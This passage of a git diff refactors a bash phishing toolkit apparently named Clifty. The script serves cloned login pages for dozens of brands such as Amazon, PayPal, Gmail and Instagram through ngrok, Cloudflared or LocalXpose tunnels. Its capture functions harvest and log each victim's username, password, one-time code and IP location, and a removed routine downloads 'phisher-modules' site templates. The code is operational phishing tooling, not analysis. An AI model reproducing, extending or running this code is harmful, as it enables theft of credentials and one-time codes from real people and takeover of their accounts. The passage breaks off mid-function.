 	cap=$(sed -n 's/"country_capital"://p' track.txt)
 	if [[ $cap != "" ]]; then
-		echo -e "${GREEN} Country capital: ${NC} $cap"
+		echo -e "${GREEN} Country capital: ${BOLDWHITE} $cap"
 	fi
 	phon=$(sed -n 's/"country_phone"://p' track.txt)
 	if [[ $phon != "" ]]; then
-		echo -e "${GREEN} Country code: ${NC} $phon"
+		echo -e "${GREEN} Country code: ${BOLDWHITE} $phon"
 	fi
 	continent=$(sed -n 's/"continent"://p' track.txt)
 	if [[ $continent != "" ]]; then
-		echo -e  "${GREEN} Continent:  ${NC} $continent"
+		echo -e  "${GREEN} Continent:  ${BOLDWHITE} $continent"
 	fi
 	ccode=$(sed -n 's/"currency_code"://p' track.txt)
 	if [[ $ccode != "" ]]; then
-		echo -e "${GREEN} Currency code: ${NC} $ccode"
+		echo -e "${GREEN} Currency code: ${BOLDWHITE} $ccode"
 	fi
 	region=$(sed -n 's/"region"://p' track.txt)
 	if [[ $region != "" ]]; then
-		echo -e "${GREEN} State: ${NC} $region"
+		echo -e "${GREEN} State: ${BOLDWHITE} $region"
 	fi
-	cat ${dumps_dir}/space.txt >> ${log_name}.txt
-        cat ${dumps_dir}/line.txt >> ${log_name}.txt
-	cat ${dumps_dir}/space.txt >> ${log_name}.txt
-	cat track.txt >> "${log_name}.txt"
+	cat ${dumps_dir}/space.txt >> ${final_logs_name}
+        cat ${dumps_dir}/line.txt >> ${final_logs_name}
+	cat ${dumps_dir}/space.txt >> ${final_logs_name}
+	cat track.txt >> "${final_logs_name}"
+        echo -ne "\n${BLUE}Saved track details in Logs"
 	rm -rf track.txt
 	rm -rf rawtrack.txt
 }
@@ -1222,117 +1800,39 @@ ip_details() {
 ## Get credentials
 capture_id() {
         victim_id=$( cat ${www_dir}/usernames.txt)
-	echo -e "\n${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_id}${RESETBG}${NA}"
-        echo -e "${GREEN} Saved in : ${LBLUE}/logs/${log_name}.txt"
-	cat ${dumps_dir}/space.txt >> "${logs_dir}/${log_name}.txt"
-        cat ${www_dir}/usernames.txt >> "${logs_dir}/${log_name}.txt"
+        echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM USERNAME : ${RESETBG}${NA}"
+	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_id}${RESETBG}${NA}"
+        echo -ne "\n${BLUE}Saved in Logs"
+	cat ${dumps_dir}/space.txt >> "${final_logs_name}"
+        cat ${www_dir}/usernames.txt >> "${final_logs_name}"
 	rm -rf ${www_dir}/usernames.txt
 }
 
 ## Get credentials
 capture_pass() {
 	victim_pass=$( cat "${www_dir}/pass.txt")
-	echo -e "\n${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_pass}${RESETBG}${NA}"
-        echo -e "${GREEN} Saved in : ${LBLUE}/logs/${log_name}.txt"
-	cat ${dumps_dir}/space.txt >> ${logs_dir}/${log_name}.txt
-        cat ${www_dir}/pass.txt >> ${logs_dir}/${log_name}.txt
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM PASSWORD : ${RESETBG}${NA}"
+	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_pass}${RESETBG}${NA}"
+        echo -ne "\n${BLUE}Saved in Logs"
+	cat ${dumps_dir}/space.txt >> ${final_logs_name}
+        cat ${www_dir}/pass.txt >> ${final_logs_name}
 	rm -rf ${www_dir}/pass.txt
 }
 
 ## Get otp
 capture_otp() {
 	victim_otp=$( cat "${www_dir}/otp.txt")
-	echo -e "\n${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_otp}${RESETBG}${NA}"
-        echo -e "${GREEN} Saved in : ${LBLUE}/logs/${log_name}.txt"
-	cat ${dumps_dir}/space.txt >> ${logs_dir}/${log_name}.txt
-        cat ${www_dir}/otp.txt >> ${logs_dir}/${log_name}.txt
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM OTP : ${RESETBG}${NA}"
+	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_otp}${RESETBG}${NA}"
+        echo -ne "\n${BLUE}Saved in Logs"
+	cat ${dumps_dir}/space.txt >> ${final_logs_name}
+        cat ${www_dir}/otp.txt >> ${final_logs_name}
 	rm -rf ${www_dir}/otp.txt
 }
 
-#online or offline stats
-check_netstats() {
-	wget -q --spider http://api.github.com
-	if [ $? -eq 0 ]; then
-		netstats="${GREEN}Online"
-		plainnetstats="online"
-	else
-		netstats="${RED}Offline"
-		plainnetstats="offline"
-	fi
-}
-userip() {
-        myip=$(curl -s ipinfo.io/ip)
-	if [ -z $myip ]; then
-		myip="${RED}Offline"
-	else
-		myip="${GREEN}$myip"
-	fi
-}
-#Logs check
-logs_check() {
-	if [ -z "$(ls -A $DIR)" ]; then
-		logs_menu
-	else
-		echo -e "No logs found"
-		{ sleep 1; clear; mainmenu; }
-	fi
-}
-logs_menu() {
-{ clear; banner; }
-userip; echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-check_netstats; echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e " "
-echo -e " "
-echo -e "${RED}[${WHITE}01${RED}]${YELLOW} View Logs    "
-echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Open Logs   "
-echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Reset Logs  "
-echo -e "${RED}[${WHITE}04${RED}]${YELLOW} Back to Tunnel menu   "
-temprompt="$(echo -e "${GREEN}>> ${ULYELLOW}Clifty/Logs${NF} >>${NA} ${BLUE}")"
-read -p "${temprompt}" reply_logs_menu
-
-        case $reply_logs_menu in
-                1 | 01)
-                        ls ${logs_dir}/
-			{ sleep 8; clear; logs_menu; };;
-                2 | 02)
-			ls ${logs_dir}/
-                        echo -e ""
-                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Enter the file name without extension (.txt) >> ${BLUE}")"
-                        read -p "${temprompt}"
-			if [ -f "${logs_dir}/$REPLY.txt" ]; then
-				cat ${logs_dir}/$REPLY.txt
-			else
-				echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-	                        { sleep 1; clear; logs_menu; }
-			fi;;
-                3 | 03)
-                        echo -e ""
-                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Do you want to clear every victim logs (Y/n) >> ${BLUE}")"
-                        read -p "${temprompt}"
-			case $REPLY in
-        	                Y | y)
-                	                rm -rf ${logs_dir}
-					echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Every logs successfully cleared!! ${NC} "
-					{ sleep 1; clear; tunnelmenu; };;
-                        	N | n | *)
-                                	{ clear;  logs_menu; };;
-
-	                esac;;
-                4 | 04)
-                        { sleep 1; clear; tunnelmenu; };;
-                *)
-                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; clear; logs_menu; };;
-        esac
-}
 ## Tunnel selection
-tunnelmenu() {
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
-echo -e ""
+tunnel_menu() {
+status_display
 echo -e "${ULWHITE}${BOLDWHITE}CHOOSE A TUNNEL TYPE${NF} : ${NC}"
 echo -e " "
 echo -e "${RED}[${WHITE}01${RED}]${YELLOW} Localhost    ${RED}[${CYAN}For Devs${RED}]"
@@ -1340,34 +1840,34 @@ echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Ngrok.io     ${RED}[${CYAN}Need to cr
 echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
 echo -e "${RED}[${WHITE}04${RED}]${YELLOW} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
 echo -e "${NC}"
-selected="Clifty/${siname}/${sitype}"
-uprompt;read -p "${prompt}" tuchoice
+
+read -p "${prompt}" tuchoice
         case $tuchoice in
                 1 | 01)
-                        tutype="LocalHost"
-                        tuid="localhost"
+                        tunnel_name="LocalHost"
+                        tunnel_id="localhost"
                         start_localhost;;
                 2 | 02)
-                        tutype="Ngrok"
-                        tuid="ngrok"
-                        check_net_tunnel ${tuid};;
+                        tunnel_name="Ngrok"
+                        tunnel_id="ngrok"
+                        check_net_tunnel ${tunnel_id};;
                 3 | 03)
-                        tutype="Cloudflared"
-                        tuid="cloudflared"
-                        check_net_tunnel ${tuid};;
+                        tunnel_name="Cloudflared"
+                        tunnel_id="cloudflared"
+                        check_net_tunnel ${tunnel_id};;
 		4 | 04)
-                        tutype="LocalXpose"
-                        tuid="localxpose"
-                        check_net_tunnel ${tuid};;
+                        tunnel_name="LocalXpose"
+                        tunnel_id="localxpose"
+                        check_net_tunnel ${tunnel_id};;
                 *)
                         echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; clear; tunnelmenu; };;
+                        { sleep 1; clear; tunnel_menu; };;
         esac
 }
 
 #check internel for tunnel
 check_net_tunnel(){
-	check_netstats
+	status
 	if [ $plainnetstats == "online" ]; then
 		"check_${1}"
 	else
@@ -1376,2155 +1876,1819 @@ check_net_tunnel(){
 		start_localhost
 	fi
 }
-
-mainmenu() {
-{ clear; banner; }
-userip; echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-check_netstats; echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e " "
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A SITE${NF} : ${NC} "
-echo -e ""
-echo -e "${BLUE} [1]${GREEN} Adobe         ${NC}""${BLUE} [26]${GREEN} Mediafire    ${NC}""${BLUE} [51]${GREEN} Telenor       ${NC}"
-echo -e "${BLUE} [2]${GREEN} Airtel Sim    ${NC}""${BLUE} [27]${GREEN} Messenger    ${NC}""${BLUE} [52]${GREEN} Tiktok        ${NC}"
-echo -e "${BLUE} [3]${GREEN} AirtelXstream ${NC}""${BLUE} [28]${GREEN} Microsoft    ${NC}""${BLUE} [53]${GREEN} Twitch        ${NC}"
-echo -e "${BLUE} [4]${GREEN} Ajio          ${NC}""${BLUE} [29]${GREEN} Mobikwik     ${NC}""${BLUE} [54]${GREEN} Twitter       ${NC}"
-echo -e "${BLUE} [5]${GREEN} Amazon 	   ${NC}""${BLUE} [30]${GREEN} Myspace      ${NC}""${BLUE} [55]${GREEN} Ubereats      ${NC}"
-echo -e "${BLUE} [6]${GREEN} Apple 	   ${NC}""${BLUE} [31]${GREEN} Netflix      ${NC}""${BLUE} [56]${GREEN} verizon       ${NC}"
-echo -e "${BLUE} [7]${GREEN} Badoo 	   ${NC}""${BLUE} [32]${GREEN} Ola          ${NC}""${BLUE} [57]${GREEN} VI            ${NC}"
-echo -e "${BLUE} [8]${GREEN} Clash of Clans${NC}""${BLUE} [33]${GREEN} Origin       ${NC}""${BLUE} [58]${GREEN} VK            ${NC}"
-echo -e "${BLUE} [9]${GREEN} Date 	   ${NC}""${BLUE} [34]${GREEN} Paypal       ${NC}""${BLUE} [59]${GREEN} Whatsapp      ${NC}"
-echo -e "${BLUE} [10]${GREEN} Devianart    ${NC}""${BLUE} [35]${GREEN} Paytm        ${NC}""${BLUE} [60]${GREEN} Wordpress     ${NC}"
-echo -e "${BLUE} [11]${GREEN} DropBox 	   ${NC}""${BLUE} [36]${GREEN} Phonepe      ${NC}""${BLUE} [61]${GREEN} Xbox          ${NC}"
-echo -e "${BLUE} [12]${GREEN} Ebay         ${NC}""${BLUE} [37]${GREEN} Pinterest    ${NC}""${BLUE} [62]${GREEN} Yahoo         ${NC}"
-echo -e "${BLUE} [13]${GREEN} Facebook     ${NC}""${BLUE} [38]${GREEN} Playstation  ${NC}""${BLUE} [63]${GREEN} Yandex        ${NC}"
-echo -e "${BLUE} [14]${GREEN} Flipcart     ${NC}""${BLUE} [39]${GREEN} ProtonMail   ${NC}""${BLUE} [64]${GREEN} Youtube Subs  ${NC}"
-echo -e "${BLUE} [15]${GREEN} Freefire     ${NC}""${BLUE} [40]${GREEN} Pubg         ${NC}""${BLUE} [65]${GREEN} Discord       ${NC}"
-echo -e "${BLUE} [16]${GREEN} Github 	   ${NC}""${BLUE} [41]${GREEN} Quora        ${NC}""${BLUE} [66]${GREEN} Google WIFI   ${NC}"
-echo -e "${BLUE} [17]${GREEN} Gitlab 	   ${NC}""${BLUE} [42]${GREEN} Reddit       ${NC}""${BLUE} [67]${GREEN} Mobile Pattern${NC}"
-echo -e "${BLUE} [18]${GREEN} Gmail	   ${NC}""${BLUE} [43]${GREEN} Shopify      ${NC}"
-echo -e "${BLUE} [19]${GREEN} Google 	   ${NC}""${BLUE} [44]${GREEN} Snapchat     ${NC}"
-echo -e "${BLUE} [20]${GREEN} Gpay 	   ${NC}""${BLUE} [45]${GREEN} Socialclub   ${NC}"
-echo -e "${BLUE} [21]${GREEN} icloud 	   ${NC}""${BLUE} [46]${GREEN} Spotify      ${NC}"
-echo -e "${BLUE} [22]${GREEN} Instagram    ${NC}""${BLUE} [47]${GREEN} Stackoverflow${NC}"
-echo -e "${BLUE} [23]${GREEN} Jazz	   ${NC}""${BLUE} [48]${GREEN} Steam        ${NC}"
-echo -e "${BLUE} [24]${GREEN} Jio 	   ${NC}""${BLUE} [49]${GREEN} Subitout     ${NC}"
-echo -e "${BLUE} [25]${GREEN} Linkedin     ${NC}""${BLUE} [50]${GREEN} Telegram     ${NC}"
-checksite_menu
-echo -e "${BLUE} [A]${MAGENTA} About         ${NC}""${BLUE} [B]${MAGENTA} Request site  ${NC}""${BLUE} [C]${MAGENTA} Report Issue${NC}"
-echo -e "${BLUE} [D]${MAGENTA} Logs          ${NC}""${BLUE} [E]${MAGENTA} Check Updates ${NC}""${BLUE} [0]${MAGENTA} Exit        ${NC}"
-echo -e " "
-uprompt;read -p "${prompt}" reply
-echo -e " "
-case $reply in
-        1 | 01)
-                site_adobe;;
-        2 | 02)
-                site_airtelsim;;
-	3 | 03)
-                site_airtelxstream;;
-	4 | 04)
-		site_ajio;;
-	5 | 05)
-                site_amazon;;
-        6 | 06)
-                site_apple;;
-	7 | 07)
-                site_badoo;;
-        8 | 08)
-                site_clashofclans;;
-	9 | 09)
-                site_date;;
-        10)
-                site_devianart;;
-	11)
-                site_dropbox;;
-	12)
-                site_ebay;;
-        13)
-                site_facebook;;
-	14)
-                site_flipcart;;
-	15)
-                site_freefire;;
-        16)
-                site_github;;
-	17)
-                site_gitlab;;
-	18)
-                site_gmail;;
-        19)
-                site_google;;
-	20)
-		site_gpay;;
-	21)
-                site_icloud;;
-	22)
-                site_instagram;;
-	23)
-                site_jazz;;
-        24)
-                site_jio;;
-        25)
-                site_linkedin;;
-        26)
-                site_mediafire;;
-	27)
-                site_messenger;;
-	28)
-                site_microsoft;;
-	29)
-                site_mobiwik;;
-	30)
-                site_myspace;;
-	31)
-                site_netflix;;
-	32)
-                site_ola;;
-	33)
-                site_origin;;
-	34)
-                site_paypal;;
-	35)
-                site_paytm;;
-	36)
-                site_phonepe;;
-	37)
-                site_pinterest;;
-	38)
-		site_playstation;;
-	39)
-                site_protonmail;;
-	40)
-                site_pubg;;
-	41)
-                site_quora;;
-	42)
-                site_reddit;;
-	43)
-                site_shopify;;
-	44)
-                site_snapchat;;
-	45)
-                site_socialclub;;
-	46)
-                site_spotify;;
-	47)
-                site_stackoverflow;;
-	48)
-                site_steam;;
-	49)
-                site_subitoit;;
-	50)
-                site_telegram;;
-	51)
-                site_telenor;;
-	52)
-                site_tiktok;;
-        53)
-                site_twitch;;
-	54)
-                site_twitter;;
-        55)
-                site_ubereats;;
-	56)
-                site_verizon;;
-        57)
-                site_visim;;
-	58)
-                site_vk;;
-        59)
-                site_whatsapp;;
-	60)
-                site_wordpress;;
-        61)
-                site_xbox;;
-	62)
-                site_yahoo;;
-        63)
-                site_yandex;;
-	64)
-                site_ytsubs;;
-	65)
-		site_discord;;
-	66)
-		site_googlewifi;;
-	67)
-		site_pattern;;
-	A | a)
-		xdg-open https://github.com/Alygnt/Clifty
-		{ sleep 2; clear;  banner; mainmenu; };;
-	B | b | C | c)
-		xdg-open https://github.com/RDXLR/Alygnt/issues/new
-		{ sleep 2; clear; banner; mainmenu; };;
-	D | d)
-		logs_check;;
-	E | e)
-		check_net_update;;
-	0 | 00)
-		msg_exit;;
-        x | X)
-                download_allsite;;
-	*)
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                 { sleep 1; clear; mainmenu; };;
-esac
-}
-
-#Check site for menu
-checksite_menu(){
-if [[ ! -d "${sites_dir}" ]]; then
-        echo -e " "
-        echo -e "               ${BLUE} [X] ${LBLUE}Download all sites            ${NC}"
-        echo -e " "
-else
-        echo -e " "
-fi
-}
-
-## DOWNLOAD SITES
-download_allsite(){
-        { clear; banner; echo -e ""; }
-        check_netstats
-	if [ $plainnetstats == "online" ]; then
-		rm -rf ${sites_dir}
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloading Sites..."
-                wget --no-check-certificate https://github.com/Alygnt/phisher-modules/archive/refs/heads/sites.zip > /dev/null 2>&1
-                sleep 1
-                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Unzipping Sites..."
-                unzip -q sites.zip
-                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Setting UP..."
-                mv phisher-modules-sites "${pro_dir}/.sites"
-                rm sites.zip
-		if [ -d "${pro_dir}/.sites" ]; then
-	                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BOLDGREEN} SITES ARE DOWNLOADED SUCCESSFULLY... ${NA}"
-	                sleep 3
-	                mainmenu
-		else
-			echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} UNABLE TO DOWNLOAD THE SITES, Try again later... ${NA}"
-                        sleep 5
-                        mainmenu
-		fi
-	else
-		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} YOUR OFFLINE!! CAN'T DOWNLOAD NOW ${NA}"
-		sleep 3
-		mainmenu
-	fi
-}
 #WEBSITES
 #adobe
-site_adobe(){
-siname="Adobe"
-dgfname="adobe"
-rdurl="www.adobe.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
-
-case $sichoice in
-	1 | 01)
-		website="adobe"
-                sitype="Default"
-		tunnelmenu;;
-	2 | 02)
-                website="adobe/otp"
-                sitype="OTP"
-                tunnelmenu;;
-	*)
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_adobe; };;
-esac
+login_adobe(){
+        site_name="Adobe"
+        dgfname="adobe"
+        rdurl="www.adobe.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
+        case $reply_site in
+                1 | 01)
+                        site_id="adobe"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="adobe/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;        
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_adobe; };;
+        esac
 }
 #airtelsim
-site_airtelsim(){
-website="airtelsim"
-rdurl="www.airtel.in"
-siname="Airtel Sim"
-website="airtelsim"
-sitype="Default"
-tunnelmenu
+login_airtelsim(){
+        site_id="airtelsim"
+        rdurl="www.airtel.in"
+        site_name="Airtel Sim"
+        site_id="airtelsim"
+        capture_type="OOTP"
+        site_template="Default"
 }
 #airtelxstream
-site_airtelxstream(){
-siname="AirtelXStream"
-dgfname="airtelxstream"
-rdurl="www.airtelxstream.in"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_airtelxstream(){
+        site_name="AirtelXStream"
+        dgfname="airtelxstream"
+        rdurl="www.airtelxstream.in"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="airtelxstream"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="airtelxstream/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_airtelxstream; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="airtelxstream"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="airtelxstream/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_airtelxstream; };;
+        esac
 }
 #ajio
-site_ajio(){
-siname="AJIO"
-dgfname="ajio"
-rdurl="www.ajio.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_ajio(){
+        site_name="AJIO"
+        dgfname="ajio"
+        rdurl="www.ajio.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="ajio"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="ajio/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_ajio; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="ajio"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="ajio/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_ajio; };;
+        esac
 }
 #amazon
-site_amazon(){
-siname="Amazon"
-dgfname="amazon"
-rdurl="www.amazon.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_amazon(){
+        site_name="Amazon"
+        dgfname="amazon"
+        rdurl="www.amazon.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="amazon"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="amazon/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_amazon; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="amazon"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="amazon/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_amazon; };;
+        esac
 }
 #apple
-site_apple(){
-siname="Apple"
-dgfname="apple"
-rdurl="www.apple.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_apple(){
+        site_name="Apple"
+        dgfname="apple"
+        rdurl="www.apple.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="apple"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="apple/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_apple; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="apple"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="apple/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_apple; };;
+        esac
 }
 #badoo
-site_badoo(){
-siname="Badoo"
-dgfname="badoo"
-rdurl="badoo.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
